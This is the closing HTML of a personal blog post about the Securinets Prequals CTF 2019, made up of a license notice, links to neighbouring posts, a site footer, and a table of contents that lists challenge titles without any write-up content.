+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://microvorld.com">damn1t</a></p><p> <span>Link:  </span><a href="http://microvorld.com/2019/03/30/CTF/Securinets Prequals CTF 2019/">http://microvorld.com/2019/03/30/CTF/Securinets Prequals CTF 2019/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/04/01/CTF/fireshell ctf(vice)/" title="fireshell ctf2019 vice"><span>< PreviousPost</span><br><span class="prevTitle">fireshell ctf2019 vice</span></a><a class="nextSlogan" href="/2019/03/29/OS/command/" title="常用指令及其含义(linux 和 windows)"><span>NextPost ></span><br><span class="nextTitle">常用指令及其含义(linux 和 windows)</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Securinets-Prequals-CTF-2019"><span class="toc-number">1.</span> <span class="toc-text">Securinets Prequals CTF 2019</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#custom-location"><span class="toc-number">1.1.</span> <span class="toc-text">custom location</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#方法二"><span class="toc-number">1.1.1.</span> <span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql-injected"><span class="toc-number">1.2.</span> <span class="toc-text">sql injected</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Beginner’s-Luck"><span class="toc-number">1.3.</span> <span class="toc-text">Beginner’s Luck</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trading-values"><span class="toc-number">1.4.</span> <span class="toc-text">Trading values</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unbreakable-Uploader"><span class="toc-number">1.5.</span> <span class="toc-text">Unbreakable Uploader</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
